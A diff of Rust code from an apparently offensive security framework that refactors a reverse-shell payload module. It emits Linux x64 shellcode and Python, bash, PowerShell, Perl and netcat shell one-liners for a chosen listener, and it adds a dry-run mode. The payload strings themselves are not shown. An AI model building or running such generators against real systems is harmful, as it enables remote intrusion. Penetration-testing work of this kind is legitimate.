@@ -119,7 +119,7 @@ fn generate_nc_shell(lhost: &str, lport: u16) -> String {
 }
 
 #[module(
-    name = "reverse_shell_payload",
+    name = "reverse_shell_generator",
     kind = "Payload",
     description = "Multi-format reverse shell payload generator (shellcode + one-liners)",
     author = "ICEBOX"
@@ -131,6 +131,85 @@ pub struct ReverseShell {
     pub lport: u16,
     #[option(help = "Payload format: shellcode,python,bash,powershell,perl,nc,all (default: all)")]
     pub format: String,
+}
+
+impl ReverseShell {
+    fn build_payloads(&self) -> (serde_json::Map<String, serde_json::Value>, Vec<String>) {
+        let lhost = self.lhost.trim();
+        let lport = self.lport;
+        let want =
+            |f: &str| self.format.is_empty() || self.format == "all" || self.format.contains(f);
+
+        let mut payloads = serde_json::Map::new();
+        let mut evidence = Vec::new();
+
+        if want("shellcode") {
+            match generate_linux_x64_shellcode(lhost, lport) {
+                Ok(shellcode) => {
+                    let hex = shellcode
+                        .iter()
+                        .map(|b| format!("\\x{b:02x}"))
+                        .collect::<String>();
+                    let b64 = base64_encode(&shellcode);
+                    let c_array = shellcode
+                        .iter()
+                        .map(|b| format!("0x{b:02x}"))
+                        .collect::<Vec<_>>()
+                        .join(", ");
+                    let c_code =
+                        format!("unsigned char buf[] = {{ {c_array} }};\nint len = sizeof(buf);\n");
+                    payloads.insert(
+                        "linux_x64_shellcode".into(),
+                        serde_json::json!({
+                            "hex": hex,
+                            "base64": b64,
+                            "c_code": c_code,
+                            "raw_len": shellcode.len(),
+                        }),
+                    );
+                    evidence.push(format!("payload/shellcode ({} bytes)", shellcode.len()));
+                }
+                Err(e) => {
+                    payloads.insert(
+                        "linux_x64_shellcode_error".into(),
+                        serde_json::json!(e.to_string()),
+                    );
+                }
+            }
+        }
+
+        if want("python") {
+            let py = generate_python_shell(lhost, lport);
+            payloads.insert("python".into(), serde_json::json!(py));
+            evidence.push("payload/python".into());
+        }
+
+        if want("bash") {
+            let sh = generate_bash_shell(lhost, lport);
+            payloads.insert("bash".into(), serde_json::json!(sh));
+            evidence.push("payload/bash".into());
+        }
+
+        if want("powershell") {
+            let ps = generate_powershell_shell(lhost, lport);
+            payloads.insert("powershell".into(), serde_json::json!(ps));
+            evidence.push("payload/powershell".into());
+        }
+
+        if want("perl") {
+            let pl = generate_perl_shell(lhost, lport);
+            payloads.insert("perl".into(), serde_json::json!(pl));
+            evidence.push("payload/perl".into());
+        }
+
+        if want("nc") {
+            let nc = generate_nc_shell(lhost, lport);
+            payloads.insert("netcat".into(), serde_json::json!(nc));
+            evidence.push("payload/netcat".into());
+        }
+
+        (payloads, evidence)
+    }
 }
 
 #[async_trait]
@@ -170,80 +249,22 @@ impl Module for ReverseShell {
         Ok(())
     }
 
+    async fn dry_run(&self) -> Result<ModuleResult, ModuleError> {
+        let (payloads, evidence) = self.build_payloads();
+        let count = payloads.len();
+        Ok(ModuleResult {
+            success: true,
+            finding: Some(format!("Generated {count} payload format(s) [dry_run]")),
+            evidence,
+            data: serde_json::json!({ "payloads": payloads, "count": count }),
+            ..Default::default()
+        })
+    }
+
     async fn run(&self) -> Result<ModuleResult, ModuleError> {
         let lhost = self.lhost.trim().to_string();
         let lport = self.lport;
-        let want =
-            |f: &str| self.format.is_empty() || self.format == "all" || self.format.contains(f);
-
-        let mut payloads = serde_json::Map::new();
-        let mut evidence = Vec::new();
-
-        if want("shellcode") {
-            match generate_linux_x64_shellcode(&lhost, lport) {
-                Ok(shellcode) => {
-                    let hex = shellcode
-                        .iter()
-                        .map(|b| format!("\\x{b:02x}"))
-                        .collect::<String>();
-                    let b64 = base64_encode(&shellcode);
-                    let c_array = shellcode
-                        .iter()
-                        .map(|b| format!("0x{b:02x}"))
-                        .collect::<Vec<_>>()
-                        .join(", ");
-                    let c_code =
-                        format!("unsigned char buf[] = {{ {c_array} }};\nint len = sizeof(buf);\n");
-                    payloads.insert(
-                        "linux_x64_shellcode".into(),
-                        serde_json::json!({
-                            "hex": hex,
-                            "base64": b64,
-                            "c_code": c_code,
-                            "raw_len": shellcode.len(),
-                        }),
-                    );
-                    evidence.push(format!("payload/shellcode ({} bytes)", shellcode.len()));
-                }
-                Err(e) => {
-                    payloads.insert(
-                        "linux_x64_shellcode_error".into(),
-                        serde_json::json!(e.to_string()),
-                    );
-                }
-            }
-        }
-
-        if want("python") {
-            let py = generate_python_shell(&lhost, lport);
-            payloads.insert("python".into(), serde_json::json!(py));
-            evidence.push("payload/python".into());
-        }
-
-        if want("bash") {
-            let sh = generate_bash_shell(&lhost, lport);
-            payloads.insert("bash".into(), serde_json::json!(sh));
-            evidence.push("payload/bash".into());
-        }
-
-        if want("powershell") {
-            let ps = generate_powershell_shell(&lhost, lport);
-            payloads.insert("powershell".into(), serde_json::json!(ps));
-            evidence.push("payload/powershell".into());
-        }
-
-        if want("perl") {
-            let pl = generate_perl_shell(&lhost, lport);
-            payloads.insert("perl".into(), serde_json::json!(pl));
-            evidence.push("payload/perl".into());
-        }
-
-        if want("nc") {
-            let nc = generate_nc_shell(&lhost, lport);
-            payloads.insert("netcat".into(), serde_json::json!(nc));
-            evidence.push("payload/netcat".into());
-        }
-
+        let (payloads, evidence) = self.build_payloads();
         let count = payloads.len();
         Ok(ModuleResult {
             success: true,
